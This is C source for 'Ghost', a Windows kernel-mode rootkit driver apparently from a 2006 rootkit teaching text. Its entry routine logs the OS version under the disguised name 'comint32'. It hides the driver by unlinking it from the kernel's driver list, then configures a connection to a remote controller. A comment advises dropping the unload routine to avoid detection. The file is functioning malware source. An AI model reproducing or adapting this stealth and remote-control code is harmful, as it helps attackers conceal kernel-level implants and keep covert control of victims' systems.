// Ghost
// Copyright Ric Vieler, 2006

#include "ntddk.h"
#include "Ghost.h"
#include "fileManager.h"
#include "configManager.h"

// Global version data
ULONG majorVersion;
ULONG minorVersion;

// Comment out in free build to avoid detection
VOID OnUnload( IN PDRIVER_OBJECT pDriverObject )
{
	DbgPrint("comint32: OnUnload called.");
}

NTSTATUS DriverEntry( IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING theRegistryPath )
{
	DRIVER_DATA* driverData;

	// Get the operating system version
	PsGetVersion( &majorVersion, &minorVersion, NULL, NULL );

	// Major = 4: Windows NT 4.0, Windows Me, Windows 98 or Windows 95
	// Major = 5: Windows Server 2003, Windows XP or Windows 2000
	// Minor = 0: Windows 2000, Windows NT 4.0 or Windows 95
	// Minor = 1: Windows XP
	// Minor = 2: Windows Server 2003

	if ( majorVersion == 5 && minorVersion == 2 )
	{
		DbgPrint("comint32: Running on Windows 2003");
	}
	else if ( majorVersion == 5 && minorVersion == 1 )
	{
		DbgPrint("comint32: Running on Windows XP");
	}
	else if ( majorVersion == 5 && minorVersion == 0 )
	{
		DbgPrint("comint32: Running on Windows 2000");
	}
	else if ( majorVersion == 4 && minorVersion == 0 )
	{
		DbgPrint("comint32: Running on Windows NT 4.0");
	}
	else
	{
		DbgPrint("comint32: Running on unknown system");
	}

	// Hide this driver
	driverData = *((DRIVER_DATA**)((DWORD)pDriverObject + 20));
	if( driverData != NULL )
	{
		// unlink this driver entry from the driver list
		*((PDWORD)driverData->listEntry.Blink) = (DWORD)driverData->listEntry.Flink;
		driverData->listEntry.Flink->Blink = driverData->listEntry.Blink;
	}

	// Allow the driver to be unloaded
	pDriverObject->DriverUnload = OnUnload; 

	// Configure the controller connection
	if( !NT_SUCCESS( Configure() ) )
	{
		DbgPrint("comint32: Could not configure remote connection.\n");		
		return STATUS_UNSUCCESSFUL;
	}

	return STATUS_SUCCESS;
}
